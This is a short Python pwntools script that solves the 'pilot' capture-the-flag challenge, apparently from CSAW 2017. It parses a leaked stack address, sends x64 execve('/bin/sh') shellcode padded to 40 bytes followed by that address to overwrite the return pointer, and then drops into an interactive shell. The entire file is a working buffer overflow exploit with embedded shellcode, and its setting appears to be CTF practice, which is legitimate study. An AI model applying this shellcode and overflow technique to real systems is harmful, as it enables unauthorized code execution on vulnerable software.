from pwn import *

context.terminal = ["wezterm", "start", "--"]
context.update(arch="amd64")
context.log_level = "debug"

p = process(b"./pilot")
# gdb.attach(p, api=True)

p.recvuntil(b"Location:")
leak = p.recvline().strip()
info(f"leak is: {leak}")

# x64 shellcode borrowed from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
shell = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload = shell
payload += b"B" * (40 - len(payload))
payload += p64(int(leak, 16))
p.sendafter(b"Command:", payload)

p.interactive()
